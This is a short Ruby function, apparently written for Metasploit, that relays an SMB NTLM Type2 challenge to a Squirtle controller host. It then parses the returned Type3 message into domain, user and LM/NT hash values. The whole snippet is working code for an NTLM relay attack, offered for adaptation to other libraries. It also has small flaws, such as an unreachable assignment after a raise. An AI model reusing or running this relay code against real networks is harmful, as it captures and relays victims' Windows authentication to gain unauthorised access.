# Example code to request a Type3 message response from a Squirtle session.
# This is for Metasploit so change it for your favorite libraries!

def process_squirtle(sqdata = '')
	
	require 'json'
	
	if (not self.pktdata)
		puts "No Type2 message to process\n"
		return
	end

	# pktdata is a raw Type2 SMB protocol negotiation packet. We only care about
	# the data from NTLMSSP to the end of the packet 
	type2pkt = self.pktdata[self.pktdata.index("NTLMSSP")..self.pktdata.length]

	type2msg =  Rex::Text.encode_base64(type2pkt)
	sqclient = Rex::Proto::Http::Client.new(sqdata['SQHost'], sqdata['SQPort'])

	begin
		req = sqclient.request_cgi(
			'method'			=> 'GET',
			'uri'					=> '/controller/type2',
			'vars_get'		=> { 'key' => sqdata['SQKey'], 'type2' => type2msg },
			'basic_auth'	=> sqdata['SQAuth']
		)

		resp = sqclient.send_recv(req, 500)
		
		if (resp.code != 200)
			raise "[!] Squirtle responded with error: #{resp.code}"
		end
		
		parsedresp = JSON.parse(resp.body)
		
		if (parsedresp['status'] == 'ok')
			(domain, user, host, lm, nt) = Rex::Proto::SMB::Utils.process_type3_message(parsedresp['result'])
		else
			raise "[!] Squirtle responded: #{parsedresp['status']}"
			(domain, user, lm, nt) = '','','',''
		end
		
	ensure
		sqclient.close
	end
		
	return domain.to_s, user.to_s, lm.to_s, nt.to_s
end